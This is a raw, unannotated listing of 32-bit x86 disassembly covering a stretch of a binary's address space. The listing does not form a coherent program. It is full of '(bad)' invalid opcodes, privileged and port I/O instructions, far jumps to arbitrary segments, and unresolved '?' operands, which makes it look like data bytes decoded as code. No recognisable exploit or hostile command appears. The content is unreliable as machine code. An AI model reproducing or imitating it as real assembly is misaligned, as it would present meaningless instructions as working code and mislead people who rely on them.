  419b9c:	fist   DWORD PTR ds:0x6871b6b3
  419ba2:	or     BYTE PTR [ecx],dl
  419ba4:	sbb    edx,DWORD PTR [eax+eax*8+0x73]
  419ba8:	jne    0x419b52
  419baa:	fbstp  TBYTE PTR [esi+0x7cce169b]
  419bb0:	xchg   esp,eax
  419bb1:	inc    ebp
  419bb2:	fistp  QWORD PTR [ebx]
  419bb4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bb6:	or     eax,0xbf2d23a0
  419bbb:	in     al,0x1
  419bbd:	xchg   ecx,eax
  419bbe:	(bad)  
  419bbf:	shl    BYTE PTR [esi-0xe],0xbf
  419bc3:	enter  0x6792,0xd5
  419bc7:	mov    ds:0x7979058b,eax
  419bcc:	push   ss
  419bcd:	iret   
  419bce:	lods   eax,DWORD PTR ds:[esi]
  419bcf:	ins    DWORD PTR es:[edi],dx
  419bd0:	fst    DWORD PTR [ecx]
  419bd2:	xchg   ecx,eax
  419bd3:	int3   
  419bd4:	dec    ecx
  419bd5:	adc    eax,0x65ae7765
  419bda:	ss test dl,bh
  419bdd:	ins    DWORD PTR es:[edi],dx
  419bde:	imul   eax,eax,0xcece8396
  419be4:	(bad)  
  419be5:	xor    esi,DWORD PTR [edx-0x20c3e681]
  419beb:	xchg   ecx,eax
  419bec:	(bad)  
  419bee:	out    0x9b,al
  419bf0:	es hlt 
  419bf2:	push   edi
  419bf3:	(bad)  
  419bf4:	ror    DWORD PTR [edx-0x2a423703],1
  419bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bfb:	stos   DWORD PTR es:[edi],eax
  419bfc:	jne    0x419bec
  419bfe:	xchg   ebp,eax
  419bff:	test   eax,0xb13950dc
  419c04:	cld    
  419c05:	in     al,0x5f
  419c07:	xchg   ebp,eax
  419c08:	sbb    ebx,ebp
  419c0a:	out    dx,eax
  419c0b:	repnz call 0xeea6:0xbf2ad8dc
  419c13:	mov    DWORD PTR [esi],ebx
  419c15:	push   ebx
  419c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c17:	jno    0x419c70
  419c19:	stc    
  419c1a:	mov    ebx,0x7f70bb56
  419c1f:	xchg   ecx,eax
  419c20:	rcr    DWORD PTR [ecx-0x76f97d36],cl
  419c26:	sbb    edx,edi
  419c28:	jo     0x419bf5
  419c2a:	inc    ebp
  419c2b:	leave  
  419c2c:	inc    esp
  419c2d:	(bad)  
  419c2e:	in     eax,dx
  419c2f:	popf   
  419c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c31:	inc    eax
  419c32:	jg     0x419c2f
  419c34:	mov    esi,0x1261d8a1
  419c39:	dec    ecx
  419c3a:	xchg   edi,eax
  419c3b:	cli    
  419c3c:	fmul   DWORD PTR [edi]
  419c3e:	loopne 0x419bd1
  419c40:	and    DWORD PTR [ebx-0x58f56891],0xbfbebdd1
  419c4a:	(bad)  
  419c4b:	fadd   DWORD PTR [ebp+0x2c]
  419c4e:	ins    BYTE PTR es:[edi],dx
  419c4f:	repz xor DWORD PTR [ebx-0x68],ebx
  419c53:	(bad)  
  419c54:	out    0xb4,eax
  419c56:	outs   dx,BYTE PTR ds:[esi]
  419c57:	pusha  
  419c58:	into   
  419c59:	jmp    0x419c80
  419c5b:	mov    eax,0xdfdc6bda
  419c60:	(bad)  [ebx+0x10]
  419c63:	xchg   esp,eax
  419c64:	loop   0x419c3d
  419c66:	mov    ebx,0x74b73a4e
  419c6b:	mov    gs,edx
  419c6d:	add    dh,BYTE PTR [esi]
  419c6f:	imul   DWORD PTR [eax-0x721a3d6]
  419c75:	mov    BYTE PTR [eax],ch
  419c77:	cmc    
  419c78:	lea    eax,[ebp+0x73e99f80]
  419c7e:	pop    ebp
  419c7f:	fwait
  419c80:	pcmpeqb mm0,QWORD PTR ds:0xb9f5988
  419c87:	lods   al,BYTE PTR ds:[esi]
  419c88:	cdq    
  419c89:	xor    ah,BYTE PTR [ebx+0x54]
  419c8c:	retf   
  419c8d:	sar    BYTE PTR [eax-0x6e],1
  419c90:	loope  0x419cce
  419c92:	pop    ecx
  419c93:	test   BYTE PTR gs:[edi+0x2a],ah
  419c97:	mov    esp,0x6d9facaa
  419c9c:	lods   eax,DWORD PTR ds:[esi]
  419c9d:	xor    bh,dh
  419c9f:	add    bh,0xb3
  419ca2:	into   
  419ca3:	xor    ah,BYTE PTR [ebx-0x6b]
  419ca6:	cmp    BYTE PTR [ebx-0x20],0x1d
  419caa:	dec    edi
  419cab:	loope  0x419d11
  419cad:	or     DWORD PTR [ecx+0xa],esi
  419cb0:	push   ecx
  419cb1:	pushf  
  419cb2:	int    0x3a
  419cb4:	mov    ?,WORD PTR [ecx-0x431b4440]
  419cba:	hlt    
  419cbb:	imul   ebx,ebp,0xcc8b48b0
  419cc1:	jno    0x419c54
  419cc3:	sti    
  419cc4:	xor    al,0x16
  419cc6:	sbb    ecx,0xf
  419cc9:	xchg   edx,eax
  419cca:	pop    es
  419ccb:	or     BYTE PTR [edx],0x34
  419cce:	jbe    0x419d49
  419cd0:	ror    DWORD PTR [edx],0x6a
  419cd3:	mov    esp,0x38eb8222
  419cd8:	jl     0x419c6b
  419cda:	xchg   esp,eax
  419cdb:	cmp    eax,0xd5fae512
  419ce0:	sbb    DWORD PTR [edi-0x10],0xeb58ff4d
  419ce7:	mov    ch,0xc7
  419ce9:	mov    bl,0xa7
  419ceb:	adc    eax,0x9ed9cb93
  419cf0:	mov    DWORD PTR [ecx+0x71],ebx
  419cf3:	lea    esp,[ebp-0x68eb3a22]
  419cf9:	xor    al,0x71
  419cfb:	and    eax,DWORD PTR [eax]
  419cfd:	inc    esi
  419cfe:	xchg   esp,eax
  419cff:	xor    dh,BYTE PTR ds:0xdd7a8ea9
  419d05:	xor    BYTE PTR [ebp+0x63de10],ch
  419d0b:	cli    
  419d0c:	mov    esi,0x42e81a7c
  419d11:	sbb    al,0xc3
  419d13:	mov    eax,ds:0xcb91481f
  419d18:	mov    DWORD PTR [eax],ebx
  419d1a:	cmp    eax,0x8ba4e342
  419d1f:	xchg   ebp,eax
  419d20:	pop    ds
  419d21:	fcom   DWORD PTR [esi+0x1e]
  419d24:	ffreep st(7)
  419d26:	sub    DWORD PTR [esi-0x31],edi
  419d29:	stc    
  419d2a:	xchg   edx,eax
  419d2b:	or     ebx,DWORD PTR [ecx-0xf]
  419d2e:	xor    al,0x4b
  419d30:	mov    bh,0x96
  419d32:	mov    dl,0xf3
  419d34:	wbinvd 
  419d36:	cdq    
  419d37:	jns    0x419cc9
  419d39:	in     al,dx
  419d3a:	xor    bl,0x66
  419d3d:	xchg   ebx,eax
  419d3e:	test   DWORD PTR [esi-0x70eae802],edx
  419d44:	pop    ebp
  419d45:	pop    ss
  419d46:	push   ss
  419d47:	enter  0x31a,0x42
  419d4b:	sub    eax,DWORD PTR [esi+0x4a46b31c]
  419d51:	sar    DWORD PTR [esi-0x50],cl
  419d54:	xor    BYTE PTR [ebp+0x11],al
  419d57:	and    BYTE PTR [ebp-0x589a7171],bh
  419d5d:	loopne 0x419ce4
  419d5f:	scas   eax,DWORD PTR es:[edi]
  419d60:	pop    ss
  419d61:	cdq    
  419d62:	push   0xe537a9ac
  419d67:	pop    ds
  419d68:	shl    BYTE PTR [edi+esi*1+0x44a9c8f7],0x63
  419d70:	xor    DWORD PTR [edi+0x7ba883c5],0xffffffa8
  419d77:	sub    esp,DWORD PTR [esi+0x44a2accb]
  419d7d:	out    0x0,eax
  419d7f:	dec    edx
  419d80:	pop    edi
  419d81:	cli    
  419d82:	jmp    0x419d23
  419d84:	xchg   esp,eax
  419d85:	pusha  
  419d86:	pop    eax
  419d87:	outs   dx,DWORD PTR ds:[esi]
  419d88:	(bad)  
  419d89:	mov    eax,0xc7514e4d
  419d8e:	cmc    
  419d8f:	or     al,0x2e
  419d91:	ss and eax,0x28c93176
  419d97:	int3   
  419d98:	sbb    DWORD PTR [edx+0x39],edi
  419d9b:	adc    al,0xed
  419d9d:	cmc    
  419d9e:	mov    esi,0xcf264930
  419da3:	into   
  419da4:	test   al,0x5
  419da6:	and    eax,edi
  419da8:	sahf   
  419da9:	jno    0x419d88
  419dab:	(bad)  
  419dac:	xchg   esi,eax
  419dad:	push   0x1d811867
  419db2:	cmp    al,0x2f
  419db4:	xchg   edx,eax
  419db5:	(bad)  
  419db6:	dec    DWORD PTR cs:[eax-0x2d]
  419dba:	sar    DWORD PTR [ebx+ebx*2-0x64eaef02],1
  419dc1:	les    eax,FWORD PTR [esi-0x50492f12]
  419dc7:	jae    0x419dc0
  419dc9:	jo     0x419dc8
  419dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dcc:	or     ecx,DWORD PTR [ebp-0x18fa4dd2]
  419dd2:	shl    BYTE PTR [eax+0x5d],1
  419dd5:	aam    0xf5
  419dd7:	out    0x31,eax
  419dd9:	xlat   BYTE PTR ds:[ebx]
  419dda:	int3   
  419ddb:	jg     0x419d6d
  419ddd:	mov    eax,0xb165b608
  419de2:	popa   
  419de3:	in     al,dx
  419de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419de6:	push   0xe54ad66
  419deb:	xchg   esi,eax
  419dec:	inc    esp
  419ded:	jg     0x419e10
  419def:	in     al,0xa0
  419df1:	push   0xffffffba
  419df3:	or     BYTE PTR [edx-0x7ef75ad8],dh
  419df9:	retf   
  419dfa:	mov    ds:0xed6c9396,al
  419dff:	ins    BYTE PTR es:[edi],dx
  419e00:	pop    ebx
  419e01:	mul    eax
  419e03:	mov    edi,0x961e3ebf
  419e08:	test   BYTE PTR [esp+ecx*2],al
  419e0b:	cmp    al,0x88
  419e0d:	add    BYTE PTR [edx],ch
  419e0f:	mov    edi,0x556d0ffc
  419e14:	(bad)  
  419e16:	test   al,0xc0
  419e18:	sub    dh,bl
  419e1a:	pop    ecx
  419e1b:	(bad)  
  419e1c:	jge    0x419dc9
  419e1e:	xor    BYTE PTR [ebp+0x19267ae6],cl
  419e24:	or     ch,BYTE PTR [esi+edi*8-0x7841f452]
  419e2b:	sub    edx,edi
  419e2d:	mov    edi,0xcfaf3935
  419e32:	add    eax,0x95395c8a
  419e37:	sub    cl,bh
  419e39:	jne    0x419e71
  419e3b:	stos   BYTE PTR es:[edi],al
  419e3c:	in     eax,0xf7
  419e3e:	and    DWORD PTR [ebx*4-0x7a781774],esp
  419e45:	dec    esi
  419e46:	mov    esi,0xdc61d167
  419e4b:	ins    DWORD PTR es:[edi],dx
  419e4c:	fisubr WORD PTR [edx+ebx*1-0x78]
  419e50:	outs   dx,BYTE PTR ds:[esi]
  419e51:	fs aad 0xa3
  419e54:	or     DWORD PTR [ebp-0x35c132f9],0xda4a59a1
  419e5e:	sub    ebp,DWORD PTR [edx-0x1c]
  419e61:	inc    ebx
  419e62:	stc    
  419e63:	movlps xmm2,QWORD PTR [eax+0x5d5b3065]
  419e6a:	outs   dx,DWORD PTR ds:[esi]
  419e6b:	lods   al,BYTE PTR ds:[esi]
  419e6c:	sti    
  419e6d:	add    ebp,0xffffff9f
  419e70:	retf   0x68c5
  419e73:	add    eax,0x955865ed
  419e78:	push   ebp
  419e79:	sbb    al,0x6a
  419e7b:	cwde   
  419e7c:	xlat   BYTE PTR ds:[ebx]
  419e7d:	(bad)  
  419e7e:	rcl    DWORD PTR [ecx-0xe],0xa7
  419e82:	clc    
  419e83:	test   BYTE PTR [ebp+0x62],ch
  419e86:	and    ch,cl
  419e88:	std    
  419e89:	test   DWORD PTR [edi+0x43],edx
  419e8c:	jb     0x419e9c
  419e8e:	and    eax,0x3b18223c
  419e93:	popa   
  419e94:	retf   
  419e95:	ins    DWORD PTR es:[edi],dx
  419e96:	or     eax,0x1bd9f192
  419e9b:	stos   BYTE PTR es:[edi],al
  419e9c:	int3   
  419e9d:	stos   BYTE PTR es:[edi],al
  419e9e:	sub    edi,0x3c
  419ea1:	push   ebp
  419ea2:	out    dx,eax
  419ea3:	fcomp  QWORD PTR [edx]
  419ea5:	test   BYTE PTR [edi+edx*8+0x322a0ca6],0x3a
  419ead:	or     edi,DWORD PTR fs:0x18eaabe4
  419eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eb5:	jecxz  0x419e6b
  419eb7:	push   edx
  419eb8:	arpl   WORD PTR [ebp-0x6f],sp
  419ebb:	or     bl,BYTE PTR [esi]
  419ebd:	xor    edx,esi
  419ebf:	cmp    BYTE PTR [esi-0x11],bh
  419ec2:	xchg   edi,eax
  419ec3:	sub    eax,0x98db677
  419ec8:	scas   eax,DWORD PTR es:[di]
  419eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ecb:	sar    dh,1
  419ecd:	ins    DWORD PTR es:[edi],dx
  419ece:	pop    ecx
  419ecf:	retf   0x1f77
  419ed2:	add    ebx,DWORD PTR [eax]
  419ed4:	lahf   
  419ed5:	mov    ?,WORD PTR [edi+0x61]
  419ed8:	dec    eax
  419ed9:	mov    dh,0x94
  419edb:	inc    edi
  419edc:	xor    al,0x22
  419ede:	inc    edx
  419edf:	fwait
  419ee0:	ins    BYTE PTR es:[edi],dx
  419ee1:	fist   WORD PTR [ebx]
  419ee3:	jp     0x419e69
  419ee5:	mov    al,ds:0x94fc9544
  419eea:	jecxz  0x419ee4
  419eec:	sub    eax,0xc733af68
  419ef1:	mov    ds:0xa18ca658,al
  419ef6:	stc    
  419ef7:	mov    esp,0xb2aac7ab
  419efc:	data16 loopne 0x419f6d
  419eff:	fmul   DWORD PTR [esp+eax*1+0x17]
  419f03:	or     cl,bl
  419f05:	xchg   BYTE PTR [esi-0x530afbff],ah
  419f0b:	ja     0x419e96
  419f0d:	retf   0xe61c
  419f10:	fisubr DWORD PTR [esi+0x73d14b49]
  419f16:	add    BYTE PTR [ebp-0x575efb84],0xf3
  419f1d:	dec    edx
  419f1e:	test   DWORD PTR [esi-0x54],ebp
  419f21:	daa    
  419f22:	scas   al,BYTE PTR es:[edi]
  419f23:	jnp    0x419f73
  419f25:	cld    
  419f26:	pop    ebp
  419f27:	in     eax,dx
  419f28:	dec    ebx
  419f29:	imul   ebx,DWORD PTR [edi-0x23222e47],0xffffffd8
  419f30:	(bad)  
  419f31:	lods   eax,DWORD PTR ds:[esi]
  419f32:	xor    eax,0xd2e3b044
  419f37:	das    
  419f38:	test   DWORD PTR [edx+0x49],ecx
  419f3b:	dec    ecx
  419f3c:	fstp   DWORD PTR [esi-0x240416da]
  419f42:	or     cl,dh
  419f44:	(bad)  
  419f45:	adc    ah,al
  419f47:	iret   
  419f48:	inc    ebx
  419f49:	mov    ebp,ebx
  419f4b:	out    dx,eax
  419f4c:	mov    db4,ebp
  419f4f:	test   eax,0x4bcc5d45
  419f54:	aaa    
  419f55:	dec    esi
  419f56:	outs   dx,DWORD PTR ds:[esi]
  419f57:	in     eax,0x36
  419f59:	add    al,0xeb
  419f5b:	int    0xc1
  419f5d:	fptan  
  419f5f:	div    BYTE PTR [ebx+edi*4]
  419f62:	sar    ch,1
  419f64:	adc    DWORD PTR [edx],edx
  419f66:	iret   
  419f67:	xor    DWORD PTR [ebx-0x69],ebp
  419f6a:	mov    al,dh
  419f6c:	rcl    DWORD PTR [ebx+0x48],1
  419f6f:	xlat   BYTE PTR ds:[ebx]
  419f70:	fwait
  419f71:	jne    0x419f91
  419f73:	jbe    0x419f33
  419f75:	xchg   edi,eax
  419f76:	sbb    dl,BYTE PTR [ebp-0x25a0f720]
  419f7c:	add    BYTE PTR [ecx],dl
  419f7e:	xchg   DWORD PTR [esi],ebx
  419f80:	mov    ss,WORD PTR ds:0x8fb4203
  419f86:	cmc    
  419f87:	idiv   DWORD PTR [edx]
  419f89:	ret    
  419f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f8b:	(bad)
  419f8e:	push   ecx
  419f8f:	dec    eax
  419f90:	pusha  
  419f91:	add    DWORD PTR [ebx],esp
  419f93:	push   es
  419f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f95:	add    BYTE PTR [edi],0x3b
  419f98:	dec    eax
  419f99:	call   0x422c6fa3
  419f9e:	cmc    
  419f9f:	xchg   ebx,eax
  419fa0:	and    DWORD PTR [esi+0x78bca6d0],ebx
  419fa6:	sub    ecx,edi
  419fa8:	xor    eax,0xb50eb095
  419fad:	int3   
  419fae:	jo     0x41a01e
  419fb0:	pop    esi
  419fb1:	cmp    bh,BYTE PTR [esi+0x2c3cdf6b]
  419fb7:	cli    
  419fb8:	and    al,0x4d
  419fba:	shl    BYTE PTR [esi],0x89
  419fbd:	xchg   esp,eax
  419fbe:	ds inc edx
  419fc0:	cmp    DWORD PTR [ecx-0x33dff5c1],eax
  419fc6:	int3   
  419fc7:	or     DWORD PTR [ebx-0x1a],ebx
  419fca:	inc    eax
  419fcb:	xchg   ebp,eax
  419fcc:	inc    BYTE PTR [ebp-0x4bb6ecc9]
  419fd2:	sub    BYTE PTR [esi],al
  419fd4:	cmp    ecx,DWORD PTR [ebx+0x401014bf]
  419fda:	pop    ds
  419fdb:	pop    ebp
  419fdc:	into   
  419fdd:	mov    al,ds:0xb5c401c3
  419fe2:	lods   eax,DWORD PTR ds:[esi]
  419fe3:	int3   
  419fe4:	stos   DWORD PTR es:[edi],eax
  419fe5:	mov    esi,0xcef2a37
  419fea:	ror    BYTE PTR [esi],1
  419fec:	stos   BYTE PTR es:[edi],al
  419fed:	adc    DWORD PTR [ecx-0x4e],0xc9b93acf
  419ff4:	add    esi,ecx
  419ff6:	jmp    0x209a:0x1e33fd59
  419ffd:	pop    es
  419ffe:	xor    DWORD PTR [edi+ecx*1],ebp
  41a001:	push   ebp
  41a002:	mov    ds:0xff97d078,al
  41a007:	out    dx,eax
  41a008:	mov    al,ds:0xc617a44a
  41a00d:	in     al,0xfd
  41a00f:	push   edi
  41a010:	outs   dx,BYTE PTR ds:[esi]
  41a011:	not    BYTE PTR [eax+0x3d]
  41a014:	cmp    al,0xa4
  41a016:	push   edx
  41a017:	add    ecx,DWORD PTR [edx]
  41a019:	jmp    0xbf97:0x560b544
  41a020:	pop    ss
  41a021:	lods   al,BYTE PTR ds:[esi]
  41a022:	fadd   st(3),st
  41a024:	and    ecx,DWORD PTR [ecx+ebx*8+0x5a]
  41a028:	repz cmc 
  41a02a:	mov    cl,BYTE PTR [esi]
  41a02c:	mov    al,0x89
  41a02e:	sub    cl,BYTE PTR [eax+0x7367b918]
  41a034:	push   edi
  41a035:	xchg   edi,eax
  41a036:	ds adc al,0x17
  41a039:	aad    0x0
  41a03b:	pop    ds
  41a03c:	ds xchg edx,eax
  41a03e:	push   ds
  41a03f:	dec    edi
  41a040:	xchg   DWORD PTR gs:[ebp+0x69450e7d],ebp
  41a047:	rol    cl,1
  41a049:	or     bl,BYTE PTR [ecx+ecx*8+0x25]
  41a04d:	pushf  
  41a04e:	out    dx,al
  41a04f:	push   edi
  41a050:	fisttp DWORD PTR [ebx+eiz*8-0x6aea9685]
  41a057:	xchg   BYTE PTR [edx-0x74],dh
  41a05a:	mov    eax,ds:0xd4f047dd
  41a05f:	enter  0x1afc,0xc7
  41a063:	repz jbe 0x41a09e
  41a066:	mov    edi,0xc5a1a579
  41a06b:	cmp    al,0xa7
  41a06d:	and    BYTE PTR [ebp-0x6b],0x86
  41a071:	popa   
  41a072:	xchg   esp,eax
  41a073:	inc    esi
  41a074:	ja     0x41a067
  41a076:	xchg   edi,ebx
  41a078:	push   edx
  41a079:	fnstcw WORD PTR [ebp-0x7024f712]
  41a07f:	inc    esp
  41a080:	lods   al,BYTE PTR ds:[esi]
  41a081:	push   es
  41a082:	test   bh,0xee
  41a085:	je     0x41a0ba
  41a087:	cmp    dh,BYTE PTR [eax]
  41a089:	cmc    
  41a08a:	xor    eax,0x908a0b01
  41a08f:	ins    BYTE PTR es:[edi],dx
  41a090:	js     0x41a055
  41a092:	mov    ch,0x74
  41a094:	in     al,dx
  41a095:	scas   al,BYTE PTR es:[edi]
  41a096:	xlat   BYTE PTR ds:[ebx]
  41a097:	add    al,0x31
  41a099:	pop    edi
  41a09a:	push   ds
  41a09b:	mov    al,0xfd
  41a09d:	inc    ecx
  41a09e:	mov    cl,0x93
  41a0a0:	hlt    
  41a0a1:	pop    ss
  41a0a2:	daa    
  41a0a3:	call   0xe7cd:0x53282446
  41a0aa:	pop    edi
  41a0ab:	push   0x39c2848b
  41a0b0:	add    DWORD PTR [ebx-0x21],0x57088cc1
  41a0b7:	pop    ebp
  41a0b8:	(bad)  
  41a0b9:	or     eax,0x69687a94
  41a0be:	xor    ah,BYTE PTR [ecx+0x4529fcaa]
  41a0c4:	sbb    DWORD PTR [ebx-0x774939a2],0x48
  41a0cb:	push   ecx
  41a0cc:	mov    ebp,0x4ee15ffe
  41a0d1:	lock in eax,dx
  41a0d3:	sbb    DWORD PTR [esi+ebx*8],esp
  41a0d6:	inc    ebp
  41a0d7:	mov    edi,0x7d949c4f
  41a0dc:	ss push es
  41a0de:	jns    0x41a0b1
  41a0e0:	call   0x5ff5:0x79fbe893
  41a0e7:	adc    DWORD PTR [esi-0x2ee359da],esi
  41a0ed:	mov    ah,0x40
  41a0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0f0:	sbb    dl,al
  41a0f2:	aas    
  41a0f3:	(bad)  
  41a0f4:	int3   
  41a0f5:	or     DWORD PTR [ecx+0x50f3a5be],ebp
  41a0fb:	sbb    al,0x2d
  41a0fd:	xchg   edx,eax
  41a0fe:	xor    ch,BYTE PTR ds:0x643baa10
  41a104:	mov    bl,0xc
  41a106:	jne    0x41a0a5
  41a108:	or     al,0x88
  41a10a:	add    cl,bh
  41a10c:	ins    DWORD PTR es:[edi],dx
  41a10d:	mov    edx,0x4b542710
  41a112:	dec    edi
  41a113:	out    0xd8,al
  41a115:	push   eax
  41a116:	rcl    DWORD PTR [edx+0x60],1
  41a119:	iret   
  41a11a:	loopne 0x41a0a9
  41a11c:	stos   BYTE PTR es:[edi],al
  41a11d:	adc    DWORD PTR [esi-0x11],eax
  41a120:	jae    0x41a17e
  41a122:	pop    esi
  41a123:	call   ecx
  41a125:	bound  ebx,QWORD PTR [esi]
  41a127:	loop   0x41a113
  41a129:	or     eax,0x80605287
  41a12e:	fmulp  st(2),st
  41a130:	in     al,0x10
  41a132:	inc    eax
  41a133:	inc    ecx
  41a134:	and    BYTE PTR [ecx],0xa5
  41a137:	sahf   
  41a138:	sbb    cl,BYTE PTR [ebx-0x79b73f36]
  41a13e:	pusha  
  41a13f:	xchg   ecx,eax
  41a140:	and    eax,0x767d7b1b
  41a145:	adc    al,0xbb
  41a147:	sub    al,0x26
  41a149:	xor    DWORD PTR [ecx+0x74a7efb9],0x11e10648
  41a153:	push   ecx
  41a154:	bound  eax,QWORD PTR [ebx]
  41a156:	pop    ss
  41a157:	ds in  al,dx
  41a159:	in     al,dx
  41a15a:	add    ebx,DWORD PTR [edi]
  41a15c:	or     al,0x7c
  41a15e:	fadd   QWORD PTR [edx+0x7170b7a1]
  41a164:	add    DWORD PTR [ebp+0x4e],eax
  41a167:	les    ebx,FWORD PTR [ebx+esi*1]
  41a16a:	stos   DWORD PTR es:[edi],eax
  41a16b:	mov    dh,0x27
  41a16d:	js     0x41a1db
  41a16f:	in     eax,0x47
  41a171:	push   ds
  41a172:	jbe    0x41a1f3
  41a174:	adc    bh,BYTE PTR [edx+eiz*2-0xb]
  41a178:	mov    dh,0xa5
  41a17a:	cs inc esp
  41a17c:	nop
  41a17d:	aam    0x98
  41a17f:	add    al,0xb
  41a181:	xchg   ecx,eax
  41a182:	mov    eax,esi
  41a184:	in     al,0xe2
  41a186:	iret   
  41a187:	ds ins BYTE PTR es:[edi],dx
  41a189:	push   edx
  41a18a:	add    al,0xe2
  41a18c:	shr    DWORD PTR [ebx+0x18ba8193],1
  41a192:	ins    BYTE PTR es:[edi],dx
  41a193:	adc    edi,ebx
  41a195:	pop    ecx
  41a196:	bound  edi,QWORD PTR ds:0x73123d9f
  41a19c:	sub    DWORD PTR [ebx],0x3e
  41a19f:	popa   
  41a1a0:	xchg   BYTE PTR [edx-0x67],bh
  41a1a3:	clc    
  41a1a4:	pop    eax
  41a1a5:	psllq  mm3,mm1
  41a1a8:	pop    ebx
  41a1a9:	test   esp,ecx
  41a1ab:	js     0x41a218
  41a1ad:	push   edi
  41a1ae:	arpl   sp,si
  41a1b0:	repnz iret 
  41a1b2:	jmp    0x64308845
  41a1b7:	sub    al,0x4e
  41a1b9:	popf   
  41a1ba:	test   ah,al
  41a1bc:	or     eax,0xddc4f0da
  41a1c1:	sub    al,0x5b
  41a1c3:	sbb    al,0x87
  41a1c5:	pop    esi
  41a1c6:	push   eax
  41a1c7:	imul   esi,DWORD PTR [eax+0x617c1531],0x7fa9ebf4
  41a1d1:	cmp    eax,0x8e1ec265
  41a1d6:	push   ds
  41a1d7:	xor    BYTE PTR [ebp+0x7d6f452a],al
  41a1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1de:	dec    ebp
  41a1df:	leave  
  41a1e0:	fadd   QWORD PTR [edi+edx*4]
  41a1e3:	add    DWORD PTR [esi-0x15],0xffffff93
  41a1e7:	add    eax,DWORD PTR ds:[ebx]
  41a1ea:	add    ah,BYTE PTR [esi]
  41a1ec:	test   DWORD PTR [edi],edx
  41a1ee:	lea    edi,[edi+0x7d]
  41a1f1:	retf   0x41ad
  41a1f4:	sub    al,0x25
  41a1f6:	or     eax,0xd1ad1a2e
  41a1fb:	iret   
  41a1fc:	fld    TBYTE PTR [esi+0x11]
  41a1ff:	mov    cl,ch
  41a201:	(bad)  
  41a202:	mov    ebp,0x569fb9c4
  41a207:	xchg   al,ah
  41a209:	stc    
  41a20a:	lahf   
  41a20b:	jl     0x41a287
  41a20d:	std    
  41a20e:	mov    DWORD PTR [edi+0x2f],esp
  41a211:	mov    ds:0x2367711,al
  41a216:	int3   
  41a217:	mov    WORD PTR [esi+ecx*8-0x7fc1f8de],gs
  41a21e:	scas   al,BYTE PTR es:[edi]
  41a21f:	aad    0x3f
  41a221:	bswap  eax
  41a223:	dec    esp
  41a224:	and    BYTE PTR [esi-0xcb72b5b],cl
  41a22a:	call   0x7e1b:0x69889d2
  41a231:	rcr    DWORD PTR [ecx],cl
  41a233:	dec    edx
  41a234:	enter  0x2a65,0x81
  41a238:	mov    dl,0xc1
  41a23a:	sar    ecx,0xf9
  41a23d:	div    ah
  41a23f:	ds in  eax,0x7f
  41a242:	dec    esp
  41a243:	mov    ebp,0x37e5d492
  41a248:	or     DWORD PTR [esi+0x55],0x348f02e0
  41a24f:	out    0x1e,al
  41a251:	mov    eax,0x5e2f0178
  41a256:	jmp    0x7cd3:0x9f4a0c16
  41a25d:	pop    ss
  41a25e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a25f:	outs   dx,DWORD PTR ds:[esi]
  41a260:	mov    WORD PTR ds:0x90cdaefb,?
  41a266:	pop    ebp
  41a267:	fld    QWORD PTR [esi+0x6a127c7f]
  41a26d:	mov    eax,gs
  41a26f:	ins    BYTE PTR es:[edi],dx
  41a270:	stos   DWORD PTR es:[edi],eax
  41a271:	xlat   BYTE PTR ds:[ebx]
  41a272:	mov    ah,0xbe
  41a274:	mov    ecx,ds
  41a276:	mov    dl,0xe
  41a278:	lahf   
  41a279:	cwde   
  41a27a:	ins    DWORD PTR es:[edi],dx
  41a27b:	(bad)  
  41a27c:	in     eax,0x5c
  41a27e:	inc    esi
  41a27f:	add    DWORD PTR [esi+0x59f7af82],0x12
  41a286:	push   es
  41a287:	dec    ebp
  41a288:	fnstsw WORD PTR cs:[eax]
  41a28b:	push   0x1
  41a28d:	xchg   DWORD PTR [eax],edx
  41a28f:	sahf   
  41a290:	test   ch,ch
  41a292:	popa   
  41a293:	mov    bh,0xd0
  41a295:	test   DWORD PTR [edi+0x73],ebx
  41a298:	and    BYTE PTR [edi-0x71],ch
  41a29b:	out    0x7d,eax
  41a29d:	mov    ds:0x2d77613d,al
  41a2a2:	cmp    ebx,DWORD PTR [ebx+ebp*1]
  41a2a5:	lahf   
  41a2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a7:	xor    eax,0x782164af
  41a2ac:	mov    BYTE PTR [edi-0x4b],ah
  41a2af:	cdq    
  41a2b0:	test   DWORD PTR [esi],0xcfacd7ba
  41a2b6:	add    BYTE PTR [eax-0x4f],cl
  41a2b9:	jmp    0x41a29b
  41a2bb:	and    eax,0xdbfc8986
  41a2c0:	and    BYTE PTR [ebx+ecx*1+0x11],dh
  41a2c4:	mov    edi,0x266e31bb
  41a2c9:	sbb    ebx,DWORD PTR [edi-0x1c312154]
  41a2cf:	pop    ecx
  41a2d0:	mov    edx,0xe60b52d7
  41a2d5:	cmp    eax,0x6be04d70
  41a2da:	sti    
  41a2db:	and    BYTE PTR [edx-0x11c19a07],ch
  41a2e1:	out    dx,al
  41a2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e3:	outs   dx,BYTE PTR ds:[esi]
  41a2e4:	sub    eax,0x23247e38
  41a2e9:	xor    bl,ah
  41a2eb:	frstor [ecx+0x6ed17920]
  41a2f1:	sbb    cl,BYTE PTR [edx-0x22]
  41a2f4:	pop    es
  41a2f5:	out    0x55,eax
  41a2f7:	or     DWORD PTR cs:[edi+0x69b50324],0x33
  41a2ff:	and    cl,bl
  41a301:	jmp    0x560b203
  41a306:	aad    0xae
  41a308:	and    DWORD PTR [esi-0x33869a4d],ecx
  41a30e:	div    BYTE PTR [ecx+0x5809f8f3]
  41a314:	cwde   
